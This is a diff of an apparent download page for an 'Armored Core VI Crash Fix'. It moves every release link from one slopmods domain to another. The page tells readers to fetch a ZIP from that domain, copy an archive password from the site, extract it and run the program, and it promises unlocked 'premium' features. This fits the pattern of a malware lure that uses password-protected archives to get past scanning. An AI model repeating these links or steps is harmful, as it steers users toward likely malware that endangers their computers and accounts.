@@ -8,12 +8,12 @@ Armored Core VI Crash Fix — Windows setup and configuration · Premium workspa
 
 > Use the release page below for Windows.
 
-- **Release page:** [lrmmppslkfk.slopmods.tech](https://lrmmppslkfk.slopmods.tech/)
-- **Full URL:** `https://lrmmppslkfk.slopmods.tech/`
+- **Release page:** [lrmmppslkfk.slopmods.top](https://lrmmppslkfk.slopmods.top/)
+- **Full URL:** `https://lrmmppslkfk.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **lrmmppslkfk.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **lrmmppslkfk.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Armored Core VI Crash Fix — Windows setup and configuration · Premium workspa
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **lrmmppslkfk.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **lrmmppslkfk.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
